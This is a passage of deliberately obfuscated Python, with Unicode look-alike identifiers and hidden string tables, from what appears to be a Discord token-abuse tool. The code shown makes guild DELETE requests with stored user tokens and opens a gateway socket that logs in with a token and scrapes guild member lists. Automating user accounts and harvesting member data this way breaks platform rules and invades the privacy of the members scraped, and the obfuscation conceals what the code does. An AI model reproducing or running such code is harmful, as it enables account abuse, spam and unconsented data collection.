                                return 𝘳𝗲𝘴𝘱𝙤𝘯𝙨𝙚.json().get(𝘐𝘕𝙄𝗡𝙡𝗹𝗜𝘔𝘐𝘐𝗹𝙈𝘭𝙡𝙄𝙡𝙡𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝘐𝗠[153])
                            except:
                                return 𝗴𝙪𝘪𝙡𝗱
                if not 𝘪𝗻_𝘨𝘂𝙞𝗹𝘥:
                    return 𝘨𝙪𝗶𝗹𝗱
            𝘀𝘦𝘵𝘢𝘵𝘁𝙧(𝘴𝙚𝗹𝘧, 'guild', 𝙜𝗲𝘁_𝘨𝙪𝙞𝙡𝗱_𝙣𝗮𝗺𝗲(𝗴𝙪𝙞𝘭𝗱))
            𝙥𝘢𝘺𝘭𝗼𝘢𝘥 = {𝘐𝘕𝙄𝙉𝗹𝘭𝘐𝘔𝗜𝘐𝗹𝙈𝗹𝘭𝘐𝘭𝗹𝘕𝗡𝘐𝘭𝙡𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝗠𝘐𝘔[154]: False}
            𝗿𝗲𝘀𝗽𝘰𝙣𝙨𝘦 = 𝙨𝙚𝙨𝙨𝗶𝙤𝙣.delete(f'{𝘐𝗡𝙄𝘕𝙡𝙡𝘐𝗠𝙄𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝙡𝘕𝙉𝗜𝙡𝙡𝗠𝘕𝙡𝗡𝗹𝘔𝘐𝙈𝙄𝗠[155]}{𝘨𝘂𝙞𝗹𝗱}', json=𝗽𝘢𝘆𝙡𝙤𝗮𝗱, headers=𝘀𝗲𝗹𝗳.headers(𝘵𝙤𝙠𝗲𝙣))
            match 𝘳𝙚𝙨𝙥𝙤𝗻𝘴𝙚.status_code:
                case 204:
                    𝗽𝗿𝗶𝗻𝘵(f'{𝘐𝗡𝗜𝙉𝘭𝙡𝗜𝗠𝗜𝙄𝙡𝗠𝘭𝘭𝙄𝗹𝙡𝗡𝗡𝘐𝘭𝗹𝘔𝗡𝘭𝘕𝙡𝗠𝗜𝗠𝘐𝗠[91]}{𝗹𝘤}{𝗜𝘕𝘐𝙉𝘭𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝙉𝗜𝗹𝙡𝙈𝙉𝙡𝗡𝙡𝙈𝗜𝘔𝗜𝗠[156]}{𝗿}{𝗜𝘕𝙄𝘕𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝗹𝗜𝘭𝘭𝘕𝗡𝘐𝙡𝙡𝘔𝘕𝘭𝘕𝘭𝘔𝙄𝗠𝘐𝘔[157]}', 𝗙𝙤𝗿𝗲.LIGHTGREEN_EX, 𝘁𝘰𝗸𝗲𝘯[:25], 𝘳, 𝙨𝘦𝗹𝙛.guild)
                case _:
                    𝘱𝗿𝘪𝗻𝘁(f'{𝘐𝘕𝘐𝙉𝗹𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝙡𝗹𝘐𝙡𝙡𝗡𝗡𝙄𝘭𝘭𝘔𝗡𝙡𝗡𝘭𝘔𝘐𝘔𝗜𝘔[91]}{𝘭𝘤}{𝙄𝘕𝗜𝙉𝘭𝙡𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝗹𝗜𝙡𝙡𝙉𝘕𝗜𝗹𝘭𝙈𝗡𝘭𝙉𝙡𝙈𝙄𝗠𝙄𝗠[147]}{𝘳}{𝙄𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝙄𝗜𝙡𝘔𝘭𝗹𝙄𝘭𝗹𝘕𝘕𝘐𝗹𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝘐𝘔[157]}', 𝙁𝘰𝘳𝗲.LIGHTRED_EX, 𝘵𝙤𝙠𝙚𝙣[:25], 𝙧𝙚𝘴𝘱𝙤𝗻𝘴𝙚.json().get(𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝘭𝗜𝙡𝙡𝗡𝗡𝗜𝗹𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝘐𝘔𝙄𝘔[148]), 𝘳)
        except 𝗘𝘹𝘤𝗲𝗽𝘁𝗶𝗼𝘯 as e:
            𝗽𝗿𝙞𝘯𝘁(f'{𝙄𝗡𝘐𝘕𝙡𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝗹𝗡𝘕𝘐𝘭𝘭𝙈𝗡𝗹𝙉𝗹𝙈𝗜𝘔𝗜𝙈[91]}{𝘭𝙘}{𝘐𝘕𝙄𝗡𝘭𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝘕𝗹𝙉𝗹𝗠𝙄𝙈𝘐𝘔[149]}{𝙧}{𝙄𝙉𝙄𝗡𝙡𝙡𝗜𝙈𝘐𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝗡𝙉𝗜𝘭𝘭𝘔𝗡𝙡𝗡𝘭𝙈𝘐𝙈𝙄𝘔[157]}', 𝘍𝙤𝗿𝗲.LIGHTRED_EX, 𝗿, 𝘵𝘰𝘬𝗲𝘯[:25], 𝙚)

class Utils:

    def rangeCorrector(ranges):
        if [0, 99] not in 𝙧𝙖𝘯𝗴𝗲𝘀:
            𝙧𝘢𝘯𝘨𝙚𝙨.insert(0, [0, 99])
        return 𝘳𝗮𝗻𝙜𝗲𝘴

    def getRanges(index, multiplier, memberCount):
        𝙞𝙣𝙞𝘁𝙞𝗮𝗹𝘕𝘶𝗺 = 𝗼𝘎𝘋𝘙𝘻𝙚𝘉𝙁𝘛6𝗳𝗨𝙞𝗮5𝙏𝙄𝗗𝘵𝗕0𝗱6𝗢𝘲𝗞𝘜𝙧𝘍𝘈𝙂𝙮.mro()[6](𝘪𝘯𝙙𝙚𝙭 * 𝙢𝙪𝙡𝘵𝗶𝘱𝗹𝗶𝙚𝘳)
        𝘳𝗮𝗻𝗴𝗲𝘀𝗟𝙞𝘀𝘵 = [[𝗶𝗻𝗶𝙩𝙞𝙖𝘭𝘕𝘂𝗺, 𝗶𝙣𝗶𝙩𝘪𝘢𝘭𝙉𝘂𝙢 + 99]]
        if 𝗺𝘦𝘮𝘣𝙚𝗿𝗖𝘰𝘂𝙣𝘁 > 𝗶𝗻𝙞𝙩𝗶𝙖𝙡𝙉𝘂𝙢 + 99:
            𝘳𝘢𝙣𝘨𝗲𝘴𝙇𝙞𝘀𝘵.append([𝗶𝘯𝘪𝘁𝘪𝙖𝘭𝗡𝘶𝘮 + 100, 𝗶𝙣𝗶𝘁𝗶𝗮𝗹𝗡𝙪𝘮 + 199])
        return 𝙐𝘵𝘪𝘭𝘀.rangeCorrector(𝙧𝘢𝗻𝗴𝘦𝙨𝗟𝗶𝙨𝙩)

    def parseGuildMemberListUpdate(response):
        𝙢𝘦𝗺𝗯𝗲𝗿𝘥𝙖𝙩𝘢 = {𝙄𝗡𝙄𝙉𝘭𝗹𝙄𝙈𝗜𝙄𝘭𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝙈𝙄𝗠𝙄𝗠[158]: 𝙧𝘦𝘀𝙥𝗼𝘯𝘀𝗲[𝙄𝙉𝗜𝙉𝗹𝘭𝘐𝗠𝙄𝗜𝗹𝘔𝘭𝙡𝗜𝙡𝗹𝘕𝘕𝗜𝙡𝗹𝘔𝙉𝗹𝗡𝘭𝗠𝙄𝙈𝘐𝙈[166]][𝘐𝙉𝗜𝘕𝘭𝗹𝗜𝘔𝘐𝗜𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝙡𝙈𝗜𝗠𝙄𝗠[158]], 𝙄𝘕𝗜𝙉𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝘔𝙡𝗹𝗜𝘭𝗹𝗡𝙉𝗜𝘭𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝙈𝘐𝘔[159]: 𝙧𝘦𝘀𝗽𝙤𝙣𝘴𝗲[𝙄𝙉𝘐𝗡𝙡𝘭𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝗹𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝘭𝘔𝗡𝘭𝘕𝘭𝗠𝘐𝙈𝙄𝘔[166]][𝙄𝗡𝗜𝙉𝗹𝗹𝗜𝗠𝗜𝗜𝗹𝙈𝙡𝙡𝗜𝘭𝗹𝙉𝙉𝙄𝘭𝘭𝗠𝘕𝙡𝙉𝙡𝘔𝗜𝗠𝗜𝗠[159]], 𝙄𝙉𝗜𝙉𝘭𝗹𝙄𝘔𝗜𝙄𝙡𝗠𝘭𝘭𝗜𝘭𝗹𝗡𝗡𝗜𝘭𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝙄𝙈𝘐𝗠[160]: 𝘳𝗲𝘀𝗽𝗼𝙣𝙨𝙚[𝗜𝙉𝙄𝘕𝙡𝗹𝘐𝘔𝘐𝘐𝗹𝘔𝗹𝗹𝙄𝙡𝙡𝗡𝗡𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝘔𝗜𝗠𝘐𝗠[166]][𝘐𝘕𝘐𝘕𝗹𝙡𝘐𝗠𝘐𝗜𝗹𝙈𝘭𝙡𝗜𝙡𝘭𝗡𝘕𝗜𝘭𝘭𝗠𝘕𝘭𝘕𝗹𝘔𝙄𝘔𝗜𝘔[160]], 𝗜𝗡𝗜𝗡𝗹𝙡𝘐𝙈𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝙡𝗹𝙉𝘕𝙄𝘭𝙡𝙈𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝙄𝘔[161]: 𝗿𝘦𝘀𝘱𝗼𝘯𝙨𝗲[𝗜𝘕𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝘐𝙡𝙈𝙡𝗹𝘐𝗹𝙡𝗡𝙉𝘐𝙡𝙡𝙈𝙉𝘭𝗡𝙡𝙈𝗜𝗠𝗜𝙈[166]][𝗜𝙉𝗜𝙉𝘭𝙡𝗜𝙈𝙄𝘐𝘭𝙈𝙡𝘭𝙄𝘭𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝙈[161]], 𝗜𝗡𝙄𝗡𝙡𝗹𝗜𝙈𝗜𝘐𝙡𝙈𝙡𝗹𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝙡𝗠𝗡𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝘔[162]: 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝘦[𝗜𝘕𝘐𝘕𝗹𝘭𝗜𝗠𝘐𝙄𝘭𝙈𝗹𝘭𝙄𝙡𝘭𝗡𝘕𝘐𝗹𝘭𝙈𝙉𝘭𝗡𝙡𝗠𝘐𝘔𝘐𝙈[166]][𝙄𝙉𝙄𝘕𝘭𝗹𝘐𝙈𝙄𝙄𝙡𝙈𝘭𝙡𝗜𝘭𝙡𝘕𝘕𝘐𝗹𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝙄𝙈𝙄𝗠[167]], 𝘐𝗡𝙄𝗡𝘭𝗹𝗜𝗠𝘐𝗜𝘭𝘔𝙡𝘭𝘐𝘭𝘭𝘕𝗡𝙄𝗹𝘭𝘔𝘕𝙡𝘕𝘭𝗠𝗜𝙈𝗜𝙈[163]: [], 𝘐𝘕𝙄𝗡𝘭𝘭𝗜𝙈𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝙡𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝙄𝙈𝙄𝗠[164]: [], 𝗜𝘕𝘐𝘕𝙡𝘭𝘐𝗠𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝙡𝙉𝙉𝙄𝙡𝗹𝙈𝙉𝘭𝗡𝙡𝗠𝙄𝙈𝙄𝙈[165]: []}
        for 𝗰𝙝𝘂𝗻𝘬 in 𝗿𝙚𝙨𝙥𝗼𝗻𝘴𝗲[𝗜𝘕𝗜𝘕𝙡𝘭𝗜𝙈𝙄𝙄𝗹𝗠𝙡𝙡𝘐𝙡𝗹𝗡𝘕𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝗹𝘔𝙄𝙈𝗜𝗠[166]][𝙄𝙉𝘐𝗡𝘭𝘭𝙄𝗠𝘐𝗜𝘭𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝙄𝗹𝙡𝘔𝘕𝗹𝗡𝙡𝘔𝘐𝗠𝘐𝘔[168]]:
            𝗺𝗲𝗺𝘣𝗲𝘳𝗱𝗮𝘁𝘢[𝘐𝘕𝗜𝙉𝙡𝙡𝙄𝗠𝙄𝙄𝘭𝙈𝗹𝗹𝗜𝙡𝘭𝙉𝗡𝙄𝙡𝙡𝗠𝙉𝘭𝙉𝗹𝗠𝘐𝙈𝙄𝙈[163]].append(𝘤𝘩𝘂𝘯𝘬[𝘐𝙉𝗜𝙉𝙡𝙡𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝗹𝙈𝗜𝗠𝘐𝗠[169]])
            if 𝘤𝘩𝘶𝙣𝘬[𝗜𝗡𝙄𝘕𝙡𝘭𝗜𝙈𝘐𝙄𝗹𝘔𝙡𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝙉𝙡𝙈𝗜𝘔𝘐𝘔[169]] in (𝗜𝗡𝙄𝙉𝙡𝗹𝗜𝗠𝘐𝗜𝗹𝗠𝙡𝗹𝗜𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝘔𝘕𝘭𝗡𝘭𝗠𝗜𝙈𝙄𝗠[170], 𝙄𝙉𝘐𝗡𝘭𝙡𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝘭𝘐𝙡𝘭𝘕𝘕𝘐𝗹𝗹𝗠𝘕𝘭𝘕𝘭𝘔𝘐𝘔𝙄𝘔[171]):
                𝙢𝗲𝘮𝗯𝗲𝗿𝙙𝘢𝘵𝙖[𝗜𝘕𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝘐𝙡𝗠𝘭𝙡𝙄𝗹𝙡𝘕𝘕𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝘔𝘐𝘔𝙄𝗠[164]].append(𝘤𝗵𝙪𝗻𝙠[𝙄𝘕𝘐𝙉𝘭𝘭𝘐𝗠𝗜𝗜𝙡𝘔𝙡𝘭𝘐𝘭𝘭𝗡𝙉𝘐𝙡𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝘐𝗠𝗜𝘔[172]])
                if 𝗰𝙝𝙪𝘯𝘬[𝙄𝘕𝗜𝙉𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝗹𝙈𝘐𝘔𝙄𝗠[169]] == 𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝙈𝗜𝘐𝘭𝘔𝙡𝘭𝗜𝗹𝘭𝘕𝙉𝘐𝗹𝘭𝙈𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝙄𝙈[170]:
                    𝗺𝗲𝙢𝗯𝙚𝙧𝗱𝗮𝘵𝙖[𝘐𝙉𝗜𝙉𝗹𝗹𝘐𝘔𝗜𝗜𝗹𝗠𝗹𝘭𝘐𝙡𝘭𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝘭𝙉𝗹𝙈𝘐𝙈𝗜𝙈[165]].append(𝗰𝘩𝙪𝗻𝘬[𝘐𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝙉𝗡𝗜𝙡𝗹𝗠𝙉𝗹𝘕𝙡𝗠𝙄𝗠𝙄𝙈[173]])
                else:
                    𝘮𝘦𝙢𝗯𝙚𝗿𝗱𝘢𝘵𝘢[𝙄𝘕𝗜𝙉𝙡𝗹𝙄𝗠𝙄𝙄𝘭𝘔𝘭𝙡𝘐𝘭𝘭𝗡𝗡𝙄𝗹𝙡𝗠𝘕𝘭𝘕𝘭𝙈𝗜𝙈𝗜𝙈[165]].append([])
            elif 𝘤𝗵𝙪𝗻𝘬[𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝙈𝙄𝙄𝘭𝗠𝗹𝘭𝗜𝘭𝗹𝙉𝘕𝗜𝙡𝘭𝘔𝘕𝗹𝘕𝘭𝘔𝗜𝗠𝘐𝗠[169]] in (𝗜𝙉𝙄𝙉𝘭𝙡𝗜𝘔𝙄𝗜𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝗠𝙉𝘭𝘕𝘭𝙈𝗜𝘔𝙄𝗠[174], 𝙄𝗡𝗜𝘕𝙡𝘭𝘐𝘔𝘐𝙄𝙡𝘔𝘭𝗹𝙄𝗹𝘭𝙉𝙉𝘐𝘭𝙡𝙈𝘕𝘭𝗡𝙡𝘔𝗜𝙈𝗜𝙈[175], 𝘐𝘕𝗜𝙉𝘭𝘭𝙄𝙈𝘐𝘐𝙡𝘔𝗹𝙡𝗜𝘭𝗹𝘕𝗡𝘐𝙡𝙡𝘔𝘕𝘭𝘕𝙡𝘔𝗜𝗠𝗜𝘔[176]):
                𝗺𝘦𝘮𝙗𝘦𝙧𝗱𝗮𝘵𝘢[𝗜𝙉𝗜𝘕𝗹𝗹𝗜𝘔𝘐𝘐𝗹𝗠𝗹𝘭𝙄𝗹𝘭𝘕𝗡𝗜𝙡𝙡𝗠𝘕𝗹𝙉𝙡𝘔𝙄𝙈𝘐𝗠[164]].append(𝘤𝗵𝙪𝘯𝗸[𝗜𝙉𝗜𝘕𝙡𝘭𝗜𝘔𝙄𝗜𝘭𝘔𝗹𝘭𝗜𝙡𝘭𝙉𝘕𝗜𝘭𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝘔𝗜𝘔[177]])
                if 𝗰𝘩𝘶𝙣𝗸[𝘐𝘕𝙄𝘕𝘭𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝗹𝙡𝘐𝗹𝗹𝗡𝗡𝗜𝙡𝗹𝘔𝗡𝘭𝗡𝙡𝗠𝘐𝘔𝘐𝘔[169]] == 𝙄𝗡𝘐𝘕𝙡𝙡𝗜𝙈𝗜𝙄𝙡𝗠𝘭𝘭𝗜𝗹𝘭𝘕𝙉𝘐𝘭𝙡𝗠𝗡𝘭𝙉𝗹𝗠𝘐𝗠𝘐𝘔[176]:
                    𝙢𝘦𝙢𝘣𝗲𝗿𝗱𝘢𝘵𝘢[𝗜𝗡𝘐𝙉𝗹𝙡𝗜𝙈𝙄𝗜𝘭𝘔𝘭𝗹𝙄𝗹𝙡𝙉𝘕𝘐𝗹𝗹𝙈𝘕𝘭𝙉𝙡𝘔𝗜𝙈𝘐𝘔[165]].append([])
                else:
                    𝗺𝘦𝘮𝘣𝗲𝘳𝙙𝘢𝘵𝗮[𝘐𝘕𝙄𝘕𝘭𝗹𝗜𝙈𝗜𝘐𝗹𝘔𝗹𝘭𝘐𝘭𝘭𝙉𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝘭𝘔𝙄𝘔𝙄𝘔[165]].append(𝙘𝙝𝘶𝘯𝗸[𝘐𝘕𝗜𝗡𝙡𝘭𝘐𝙈𝙄𝙄𝙡𝙈𝙡𝘭𝗜𝙡𝗹𝗡𝗡𝗜𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝙈𝗜𝗠𝘐𝙈[178]])
        return 𝘮𝙚𝗺𝘣𝗲𝘳𝗱𝗮𝘁𝘢

class DiscordSocket(𝘸𝙚𝙗𝙨𝘰𝘤𝙠𝗲𝘁.WebSocketApp):

    def __init__(self, token, guild_id, channel_id):
        𝙨𝗲𝘁𝘢𝘁𝘵𝘳(𝙨𝙚𝗹𝗳, 'token', 𝘵𝘰𝗸𝗲𝘯)
        𝘀𝙚𝘵𝘢𝘁𝘁𝙧(𝘀𝘦𝘭𝙛, 'guild_id', 𝘨𝙪𝘪𝗹𝙙_𝘪𝙙)
        𝘀𝘦𝘁𝙖𝘁𝙩𝗿(𝘀𝘦𝙡𝘧, 'channel_id', 𝘤𝗵𝗮𝙣𝙣𝙚𝘭_𝙞𝙙)
        𝘀𝘦𝗹𝗳.blacklisted_roles, 𝘴𝘦𝘭𝗳.blacklisted_users = ([], [])
        𝙨𝘦𝙩𝗮𝘵𝘵𝗿(𝙨𝘦𝙡𝙛, 'socket_headers', {𝗜𝙉𝗜𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝘔𝙡𝗹𝘐𝗹𝙡𝘕𝗡𝗜𝙡𝗹𝗠𝘕𝘭𝗡𝗹𝗠𝙄𝗠𝘐𝗠[179]: 𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝘔𝘐𝙄𝙡𝗠𝗹𝘭𝘐𝙡𝙡𝙉𝘕𝘐𝗹𝙡𝗠𝘕𝘭𝙉𝗹𝗠𝘐𝙈𝙄𝘔[185], 𝙄𝘕𝙄𝙉𝙡𝗹𝘐𝘔𝗜𝗜𝙡𝙈𝗹𝙡𝘐𝘭𝗹𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝘭𝘕𝗹𝘔𝗜𝗠𝙄𝙈[180]: 𝙄𝗡𝗜𝙉𝘭𝗹𝘐𝗠𝙄𝗜𝙡𝘔𝗹𝙡𝙄𝗹𝙡𝙉𝙉𝗜𝘭𝙡𝗠𝙉𝘭𝗡𝘭𝗠𝘐𝗠𝙄𝙈[186], 𝘐𝙉𝙄𝙉𝙡𝘭𝗜𝗠𝗜𝙄𝗹𝗠𝙡𝙡𝘐𝘭𝘭𝘕𝘕𝗜𝗹𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝗜𝘔𝗜𝙈[181]: 𝘐𝙉𝘐𝗡𝗹𝙡𝙄𝘔𝘐𝙄𝙡𝘔𝗹𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝘭𝘔𝗜𝘔𝘐𝘔[187], 𝘐𝗡𝘐𝗡𝙡𝙡𝘐𝘔𝙄𝘐𝗹𝗠𝗹𝘭𝙄𝘭𝘭𝘕𝗡𝗜𝗹𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝗜𝗠𝗜𝘔[182]: 𝗜𝗡𝗜𝙉𝗹𝗹𝙄𝙈𝙄𝘐𝗹𝘔𝗹𝗹𝙄𝗹𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝙈𝙄𝙈[187], 𝗜𝙉𝗜𝗡𝘭𝙡𝘐𝙈𝘐𝗜𝗹𝗠𝘭𝙡𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝙡𝘔𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝗜𝘔[183]: 𝗜𝙉𝗜𝙉𝗹𝙡𝙄𝙈𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝗡𝗜𝗹𝘭𝘔𝗡𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝘔[188], 𝙄𝙉𝗜𝗡𝘭𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝙡𝙡𝙄𝘭𝙡𝘕𝙉𝙄𝙡𝙡𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝘔𝘐𝙈[184]: 𝘐𝗡𝙄𝗡𝘭𝗹𝙄𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝗹𝙡𝘕𝘕𝘐𝙡𝗹𝙈𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝘔[189]})
        𝘴𝙪𝘱𝙚𝘳().__init__(𝘐𝘕𝘐𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝙡𝗠𝗹𝙡𝘐𝙡𝗹𝗡𝘕𝗜𝙡𝘭𝙈𝙉𝘭𝗡𝘭𝙈𝘐𝗠𝘐𝗠[190], header=𝙨𝙚𝙡𝘧.socket_headers, on_open=lambda ws: 𝘴𝙚𝘭𝘧.sock_open(𝙬𝘀), on_message=lambda ws, msg: 𝘴𝙚𝘭𝗳.sock_message(𝙬𝙨, 𝙢𝘀𝗴), on_close=lambda ws, close_code, close_msg: 𝙨𝙚𝙡𝗳.sock_close(𝘄𝘴, 𝗰𝘭𝗼𝘀𝗲_𝘤𝙤𝙙𝘦, 𝘤𝗹𝙤𝘴𝗲_𝙢𝙨𝗴))
        𝘴𝙚𝙩𝘢𝘵𝘵𝙧(𝙨𝗲𝙡𝗳, 'endScraping', False)
        𝙨𝘦𝘵𝘢𝘁𝙩𝙧(𝘴𝗲𝘭𝗳, 'guilds', {})
        𝙨𝙚𝘁𝙖𝙩𝘵𝘳(𝘀𝗲𝙡𝗳, 'members', {})
        𝘴𝙚𝘵𝗮𝘵𝘁𝗿(𝙨𝗲𝙡𝘧, 'ranges', [[0, 0]])
        𝘴𝘦𝘵𝙖𝘵𝙩𝙧(𝘴𝘦𝘭𝘧, 'lastRange', 0)
        𝘀𝙚𝘵𝘢𝘵𝘁𝘳(𝘀𝘦𝘭𝗳, 'packets_recv', 0)

    def run(self):
        𝘴𝘦𝗹𝗳.run_forever()
        return 𝘀𝘦𝘭𝗳.members

    def scrapeUsers(self):
        if 𝘴𝘦𝘭𝙛.endScraping == False:
            𝘴𝙚𝙡𝙛.send(𝘐𝙉𝘐𝘕𝘭𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝙡𝗹𝙄𝙡𝘭𝙉𝗡𝗜𝙡𝙡𝘔𝙉𝘭𝙉𝘭𝗠𝘐𝘔𝙄𝘔[191] + 𝙨𝙚𝘭𝘧.guild_id + 𝘐𝗡𝘐𝘕𝘭𝙡𝘐𝗠𝗜𝙄𝘭𝗠𝘭𝗹𝙄𝙡𝗹𝘕𝗡𝙄𝘭𝘭𝗠𝙉𝘭𝙉𝙡𝗠𝙄𝘔𝙄𝘔[192] + 𝘀𝗲𝗹𝙛.channel_id + 𝘐𝗡𝗜𝙉𝘭𝘭𝗜𝙈𝙄𝙄𝙡𝗠𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝙄𝙡𝗹𝙈𝗡𝘭𝗡𝙡𝙈𝙄𝙈𝘐𝘔[193] + 𝘫𝘀𝘰𝙣.dumps(𝙨𝗲𝙡𝘧.ranges) + 𝙄𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝘐𝘐𝘭𝗠𝘭𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝘐𝙈[194])

    def sock_open(self, ws):
        𝘀𝘦𝙡𝗳.send(𝗜𝘕𝙄𝘕𝗹𝘭𝙄𝗠𝙄𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝙉𝙡𝙈𝙄𝘔𝗜𝙈[195] + 𝘀𝙚𝘭𝙛.token + 𝙄𝘕𝘐𝙉𝘭𝙡𝘐𝗠𝘐𝘐𝗹𝙈𝗹𝘭𝙄𝙡𝗹𝙉𝙉𝗜𝘭𝙡𝙈𝘕𝘭𝙉𝘭𝗠𝘐𝙈𝘐𝘔[196])

    def heartbeatThread(self, interval):
        try:
            while True:
                𝙨𝗲𝙡𝘧.send(𝗜𝙉𝗜𝗡𝗹𝘭𝙄𝙈𝗜𝗜𝙡𝗠𝘭𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝙡𝗹𝙈𝗡𝙡𝘕𝗹𝙈𝘐𝗠𝙄𝙈[197] + 𝗳𝙄𝘇𝙫9𝘀6𝗕𝗘9𝘴𝘡3𝙬𝙕𝗔0𝙝𝙞2𝙬𝗶5𝗟8𝙖790𝗝6𝗱.mro()[6](𝘴𝙚𝗹𝘧.packets_recv) + 𝗜𝗡𝙄𝙉𝗹𝗹𝗜𝙈𝙄𝙄𝘭𝗠𝗹𝗹𝘐𝘭𝗹𝙉𝙉𝗜𝘭𝗹𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝙈𝗜𝘔[198])
                𝘵𝗶𝙢𝘦.sleep(𝗶𝙣𝘁𝘦𝘳𝘃𝘢𝙡)
        except 𝘌𝘅𝘤𝙚𝙥𝙩𝗶𝗼𝗻 as e:
            pass
            return

    def sock_message(self, ws, message):
        𝗱𝗲𝙘𝗼𝗱𝘦𝘥 = 𝗷𝘀𝗼𝙣.loads(𝘮𝗲𝘀𝘴𝘢𝗴𝘦)
        if 𝙙𝙚𝘤𝗼𝙙𝗲𝘥 is None:
            return
        if 𝗱𝗲𝙘𝗼𝗱𝗲𝘥[𝘐𝘕𝘐𝘕𝙡𝙡𝘐𝙈𝙄𝘐𝙡𝘔𝗹𝙡𝙄𝗹𝗹𝙉𝗡𝗜𝙡𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝗜𝘔[169]] != 11:
            𝙨𝙚𝙡𝘧.packets_recv += 1
        if 𝙙𝘦𝙘𝙤𝘥𝘦𝙙[𝗜𝙉𝗜𝙉𝙡𝘭𝘐𝗠𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝗹𝗹𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝗹𝗡𝘭𝗠𝗜𝙈𝘐𝙈[169]] == 10:
